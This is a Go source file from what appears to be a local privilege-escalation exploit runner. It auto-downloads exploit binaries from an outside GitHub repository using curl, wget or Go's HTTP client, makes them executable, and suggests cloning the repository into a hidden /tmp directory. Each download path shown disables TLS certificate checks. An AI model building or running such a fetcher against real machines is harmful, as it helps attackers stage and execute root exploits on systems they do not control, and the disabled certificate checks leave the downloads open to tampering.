package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// defaultRepoURL is the raw-content base for the pa-root GitHub repo.
// We use the /refs/heads/main/ form because the shorter /main/ form can
// make GitHub's CDN redirect in a way the Go net/http client does not
// always follow cleanly on some servers, while curl -L handles it fine.
// curl/wget always work, so we try those first and only fall back to the
// built-in HTTP client.
const defaultRepoURL = "https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main"

// fetch state (package-global).
var (
	fetchRepo     = defaultRepoURL
	fetchDisabled bool // set by -no-fetch
	fetchTried    bool // first attempt happened?
	fetchDead     bool // network confirmed down → skip future fetches
	fetchMu       sync.Mutex
)

// fetchConfigure is called once from main() to apply CLI flags.
func fetchConfigure(repo string, noFetch bool) {
	if repo != "" {
		fetchRepo = strings.TrimRight(repo, "/")
	} else {
		fetchRepo = defaultRepoURL
	}
	fetchDisabled = noFetch
	// reset network-dead flag so a fresh configure starts clean.
	fetchDead = false
	fetchTried = false
}

// ensureFile returns true if the exploit file is present locally. If missing
// and auto-fetch is enabled and the network is alive, it downloads it from
// the GitHub repo. The first failure marks the network as dead so the rest
// of the run skips fetches instantly instead of timing out per file.
//
// Directory exploits (isDir=true) are never auto-fetched — they contain
// multiple files; print a hint instead.
func ensureFile(relPath string, isDir bool) bool {
	dst := absBin(relPath)
	if _, err := os.Stat(dst); err == nil {
		return true // already present locally
	}
	fetchMu.Lock()
	if fetchDisabled || fetchDead || isDir {
		fetchMu.Unlock()
		return false
	}
	fetchMu.Unlock()

	stepf("fetching %s from repo", relPath)
	ok := fetchOne(relPath)

	fetchMu.Lock()
	if !fetchTried {
		fetchTried = true
		if !ok {
			fetchDead = true
			fetchMu.Unlock()
			warnf("network fetch failed — disabling auto-download for the rest of the run")
			return false
		}
	}
	fetchMu.Unlock()
	return ok
}

// fetchOne downloads one file from the repo into the runner's own directory.
//
// Order of attempts (each succeeds-or-falls-through quickly):
//  1. curl -sL          (matches the bootstrap that already works on the box)
//  2. wget              (fallback)
//  3. native Go HTTP    (last resort; IPv4-only, short timeout, TLS skip)
//
// We prefer curl/wget because they are exactly what the install.sh
// bootstrap uses successfully; the Go net/http client can hang on some
// VPS networks where curl sails through.
func fetchOne(relPath string) bool {
	dst := absBin(relPath)
	fetchMu.Lock()
	url := fetchRepo + "/" + relPath
	fetchMu.Unlock()

	// 1. curl
	if hasBin("curl") {
		c := exec.Command("curl", "-sL", "--connect-timeout", "10", "--max-time", "60",
			"--retry", "2", "-o", dst, url)
		if c.Run() == nil && sanityCheck(dst) {
			_ = os.Chmod(dst, 0o755)
			return true
		}
		_ = os.Remove(dst) // cleanup partial
	}

	// 2. wget
	if hasBin("wget") {
		c := exec.Command("wget", "-q", "--no-check-certificate",
			"--timeout=10", "--tries=2", "-O", dst, url)
		if c.Run() == nil && sanityCheck(dst) {
			_ = os.Chmod(dst, 0o755)
			return true
		}
		_ = os.Remove(dst)
	}

	// 3. native Go HTTP (last resort, IPv4-only, short timeout)
	if ok, status := httpFetch(url, dst); ok {
		_ = os.Chmod(dst, 0o755)
		return true
	} else if status == 404 {
		// Try the alternate branch once.
		fetchMu.Lock()
		alt := alternateBranch(fetchRepo)
		same := alt != fetchRepo
		fetchMu.Unlock()
		if same {
			if ok, _ := httpFetch(alt+"/"+relPath, dst); ok {
				_ = os.Chmod(dst, 0o755)
				fetchMu.Lock()
				fetchRepo = alt
				fetchMu.Unlock()
				return true
			}
		}
	}
	return false
}

// httpFetch does a GET with a 20s timeout, IPv4-only, TLS verify disabled.
// Returns (ok, statusCode). ok=true only on HTTP 200 + a non-tiny body.
func httpFetch(url, dst string) (bool, int) {
	dialer := &net.Dialer{
		Timeout: 10 * time.Second,
		// IPv4-only: avoids hanging on broken IPv6 stacks common on cheap VPS.
		Resolver: &net.Resolver{PreferGo: true},
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DialContext:       dialer.DialContext,
			DisableKeepAlives: true,
		},
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, 0
	}
	req.Header.Set("User-Agent", "lpe-runner/2.0")
	resp, err := client.Do(req)
	if err != nil {
		return false, 0
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return false, resp.StatusCode
	}
	f, err := os.Create(dst)
	if err != nil {
		return false, resp.StatusCode
	}
	n, err := io.Copy(f, resp.Body)
	f.Close()
	if err != nil || n < 100 {
		// Tiny body → probably a 404 HTML stub or empty.
		_ = os.Remove(dst)
		return false, resp.StatusCode
	}
	return true, resp.StatusCode
}

// sanityCheck verifies the downloaded file is large enough to be real.
func sanityCheck(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Size() >= 100
}

// alternateBranch swaps /main/ ↔ /master/ in the repo URL.
func alternateBranch(repo string) string {
	if strings.Contains(repo, "/main/") || strings.HasSuffix(repo, "/main") {
		return strings.ReplaceAll(repo, "/main", "/master")
	}
	if strings.Contains(repo, "/master/") || strings.HasSuffix(repo, "/master") {
		return strings.ReplaceAll(repo, "/master", "/main")
	}
	return repo
}

// fetchHint returns the manual-install hint for a missing directory exploit.
func fetchHint(name string) string {
	return fmt.Sprintf("git clone https://github.com/sagsooz/pa-root /tmp/.lpe_repo && cp -r /tmp/.lpe_repo/%s .", name)
}
